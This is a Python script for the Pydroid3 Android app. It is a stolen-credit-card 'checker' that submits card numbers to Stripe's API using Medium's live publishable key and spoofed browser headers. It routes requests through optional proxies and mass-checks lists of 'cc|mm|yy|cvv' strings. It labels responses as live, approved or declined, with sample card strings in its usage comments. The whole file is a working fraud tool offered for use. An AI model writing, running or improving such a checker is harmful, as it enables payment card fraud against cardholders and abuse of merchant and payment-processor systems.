"""
Medium.com Card Checker - Stripe API Integration
Designed for Pydroid3 Android App
"""

import httpx
import uuid
import time
import re
import json
import asyncio
from urllib.parse import urlencode

# Stripe Public Key for Medium
STRIPE_PK = "pk_live_7FReX44VnNIInZwrIIx6ghjl"
STRIPE_VERSION = "2025-03-31.basil"


def generate_guid():
    """Generate a unique GUID for Stripe"""
    return str(uuid.uuid4()) + "6a66cf"


def generate_muid():
    """Generate a unique MUID for Stripe"""
    return str(uuid.uuid4()) + "3ed771"


def generate_sid():
    """Generate a unique SID for Stripe"""
    return str(uuid.uuid4()) + "3a3b60"


def generate_session_id():
    """Generate client session ID"""
    return str(uuid.uuid4())


def get_stripe_headers():
    """Get headers for Stripe API requests"""
    return {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }


async def create_payment_method(cc, mes, ano, cvv, proxy=None):
    """
    Step 1: Create a payment method on Stripe
    Returns: payment_method_id (pm_xxx) or error message
    """
    guid = generate_guid()
    muid = generate_muid()
    sid = generate_sid()
    session_id = generate_session_id()
    
    # Format year (handle both YY and YYYY formats)
    if len(str(ano)) == 4:
        ano = str(ano)[2:]
    
    data = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': str(mes).zfill(2),
        'card[exp_year]': str(ano),
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; split-card-element',
        'referrer': 'https://medium.com',
        'time_on_page': str(int(time.time() * 1000) % 100000),
        'client_attribution_metadata[client_session_id]': session_id,
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'split-card-element',
        'client_attribution_metadata[merchant_integration_version]': '2017',
        'key': STRIPE_PK,
        '_stripe_version': STRIPE_VERSION,
    }
    
    headers = get_stripe_headers()
    
    try:
        transport = None
        if proxy:
            transport = httpx.AsyncHTTPTransport(proxy=proxy)
        
        async with httpx.AsyncClient(timeout=60.0, transport=transport) as client:
            response = await client.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                data=urlencode(data)
            )
            result = response.json()
            
            if 'id' in result:
                return {"success": True, "pm_id": result['id'], "response": result}
            elif 'error' in result:
                error = result['error']
                return {
                    "success": False, 
                    "error": error.get('decline_code', error.get('code', 'unknown')),
                    "message": error.get('message', 'Unknown error'),
                    "response": result
                }
            else:
                return {"success": False, "error": "unknown", "message": "Unexpected response", "response": result}
                
    except httpx.TimeoutException:
        return {"success": False, "error": "timeout", "message": "Request timeout"}
    except Exception as e:
        return {"success": False, "error": "exception", "message": str(e)}


async def get_payment_intent(proxy=None):
    """
    Get a payment intent from Medium's GraphQL API
    This simulates getting a new payment intent for subscription
    """
    # For now, we'll skip this step as the main validation happens in create_payment_method
    # In a full implementation, you would need valid Medium cookies to get a payment intent
    return {"success": False, "error": "not_implemented", "message": "Payment intent retrieval not implemented"}


async def confirm_payment_intent(pm_id, pi_id, pi_secret, proxy=None):
    """
    Step 2: Confirm the payment intent with the payment method
    Returns: result of confirmation
    """
    session_id = generate_session_id()
    
    data = {
        'return_url': 'https://medium.com/welcome-member',
        'payment_method': pm_id,
        'expected_payment_method_type': 'card',
        'use_stripe_sdk': 'true',
        'key': STRIPE_PK,
        '_stripe_version': STRIPE_VERSION,
        'client_attribution_metadata[client_session_id]': session_id,
        'client_attribution_metadata[merchant_integration_source]': 'l1',
        'client_secret': pi_secret,
    }
    
    headers = get_stripe_headers()
    
    try:
        transport = None
        if proxy:
            transport = httpx.AsyncHTTPTransport(proxy=proxy)
            
        async with httpx.AsyncClient(timeout=60.0, transport=transport) as client:
            response = await client.post(
                f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm',
                headers=headers,
                data=urlencode(data)
            )
            result = response.json()
            
            if 'error' in result:
                error = result['error']
                return {
                    "success": False,
                    "error": error.get('decline_code', error.get('code', 'unknown')),
                    "message": error.get('message', 'Unknown error'),
                    "response": result
                }
            else:
                status = result.get('status', 'unknown')
                return {"success": True, "status": status, "response": result}
                
    except httpx.TimeoutException:
        return {"success": False, "error": "timeout", "message": "Request timeout"}
    except Exception as e:
        return {"success": False, "error": "exception", "message": str(e)}


async def check_card(cc, mes, ano, cvv, proxy=None):
    """
    Main function to check a card using Medium/Stripe
    Returns: (status_code, message, raw_response)
    
    Status codes:
    - LIVE: Card is valid and can be charged
    - CCN: Card number invalid
    - APPROVED: Card passed initial validation (CVV/Date issues indicate live)
    - DECLINED: Card was declined
    - ERROR: Some error occurred
    """
    # Step 1: Create payment method
    pm_result = await create_payment_method(cc, mes, ano, cvv, proxy)
    
    if not pm_result.get('success'):
        error = pm_result.get('error', 'unknown')
        message = pm_result.get('message', 'Unknown error')
        
        # Parse error codes
        error_lower = error.lower()
        message_lower = message.lower()
        
        # Card number errors
        if any(x in error_lower for x in ['invalid_number', 'incorrect_number']):
            return ("CCN", "Invalid Card Number", error)
        
        # CVV errors - indicates card is live
        if any(x in error_lower for x in ['incorrect_cvc', 'invalid_cvc']):
            return ("APPROVED", "Incorrect CVC [Live Card]", error)
        
        # Expiry errors - indicates card is live  
        if any(x in error_lower for x in ['invalid_expiry', 'expired_card', 'card_expired']):
            return ("APPROVED", "Expiry Issue [Live Card]", error)
        
        # Insufficient funds - live card
        if 'insufficient_funds' in error_lower:
            return ("APPROVED", "Insufficient Funds [Live Card]", error)
        
        # Generic declined
        if 'card_declined' in error_lower or 'declined' in error_lower:
            # Check for specific decline reasons
            if 'stolen' in message_lower or 'lost' in message_lower:
                return ("DECLINED", "Card Reported Lost/Stolen", error)
            if 'pickup' in message_lower:
                return ("DECLINED", "Card Pickup - Possible Fraud", error)
            if 'do_not_honor' in error_lower:
                return ("DECLINED", "Do Not Honor", error)
            if 'fraudulent' in error_lower:
                return ("DECLINED", "Suspected Fraud", error)
            return ("DECLINED", message, error)
        
        # 3D Secure required - live card
        if '3d_secure' in error_lower or 'authentication_required' in error_lower:
            return ("APPROVED", "3D Secure Required [Live Card]", error)
        
        # Rate limits
        if 'rate_limit' in error_lower:
            return ("ERROR", "Rate Limited", error)
        
        # Generic error
        return ("DECLINED", message, error)
    
    # Card passed initial validation - payment method created
    pm_id = pm_result.get('pm_id')
    return ("LIVE", f"Payment Method Created: {pm_id}", pm_id)


async def check_card_full(fullcc, proxy=None):
    """
    Check card from full format: cc|mm|yy|cvv
    """
    parts = fullcc.replace('/', '|').replace(' ', '').split('|')
    
    if len(parts) < 4:
        return ("ERROR", "Invalid card format. Use: cc|mm|yy|cvv", "format_error")
    
    cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
    
    # Validate card number (basic Luhn check)
    if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
        return ("CCN", "Invalid card number length", "invalid_length")
    
    return await check_card(cc, mes, ano, cvv, proxy)


def parse_response(status, message, raw):
    """
    Parse the response and return formatted result
    """
    if status == "LIVE":
        return {
            "status": "Charged 💎",
            "message": message,
            "raw": raw,
            "color": "green"
        }
    elif status == "APPROVED":
        return {
            "status": "Approved ✅",
            "message": message,
            "raw": raw,
            "color": "yellow"
        }
    elif status == "CCN":
        return {
            "status": "Invalid CCN ❌",
            "message": message,
            "raw": raw,
            "color": "red"
        }
    elif status == "DECLINED":
        return {
            "status": "Declined ❌",
            "message": message,
            "raw": raw,
            "color": "red"
        }
    else:
        return {
            "status": "Error ⚠️",
            "message": message,
            "raw": raw,
            "color": "gray"
        }


# ==================== PYDROID3 STANDALONE VERSION ====================

def run_single_check(card):
    """
    Run a single card check (for Pydroid3)
    Usage: run_single_check("4403934091847371|06|26|097")
    """
    async def _check():
        return await check_card_full(card)
    
    return asyncio.get_event_loop().run_until_complete(_check())


def run_mass_check(cards_list, show_progress=True):
    """
    Run mass card check (for Pydroid3)
    Usage: run_mass_check(["card1", "card2", ...])
    """
    results = []
    
    async def _check_all():
        for i, card in enumerate(cards_list):
            if show_progress:
                print(f"[{i+1}/{len(cards_list)}] Checking: {card[:10]}...")
            
            status, message, raw = await check_card_full(card)
            result = parse_response(status, message, raw)
            results.append({
                "card": card,
                **result
            })
            
            if show_progress:
                print(f"  └── {result['status']}: {message}")
            
            # Small delay to avoid rate limiting
            await asyncio.sleep(0.5)
        
        return results
    
    return asyncio.get_event_loop().run_until_complete(_check_all())


# Main execution for Pydroid3
if __name__ == "__main__":
    print("=" * 50)
    print("  MEDIUM STRIPE CARD CHECKER - Pydroid3")
    print("=" * 50)
    print()
    
    # Example usage
    test_card = input("Enter card (cc|mm|yy|cvv): ").strip()
    
    if test_card:
        print("\n[*] Checking card...")
        status, message, raw = run_single_check(test_card)
        result = parse_response(status, message, raw)
        
        print("\n" + "=" * 50)
        print(f"Card: {test_card}")
        print(f"Status: {result['status']}")
        print(f"Message: {result['message']}")
        print(f"Raw: {result['raw']}")
        print("=" * 50)
    else:
        print("No card entered!")
